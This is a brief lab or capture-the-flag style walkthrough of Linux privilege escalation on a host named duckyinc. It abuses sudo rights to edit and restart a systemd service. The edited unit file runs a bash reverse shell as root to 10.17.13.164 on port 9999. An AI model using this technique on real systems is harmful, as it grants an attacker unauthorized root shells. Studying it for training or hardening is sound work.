

### Privilege Escalation via Systemd Service Modification


check for sudo -l permission

here i have permission : 

```
User server-admin may run the following commands on duckyinc:
   (root) 
   /bin/systemctl start duckyinc.service, 
   /bin/systemctl enable duckyinc.service, 
   /bin/systemctl restart duckyinc.service, 
   /bin/systemctl daemon-reload, 
   sudoedit /etc/systemd/system/duckyinc.service
```

So here we have the permission for both editing and restarting the service : 

edit duckyinc.service :

```
[Unit]
Description=root shell

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.13.164/9999 0>&1'

[Install]
WantedBy=multi-user.target
```


Restart : 

```
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart duckyinc.service
```
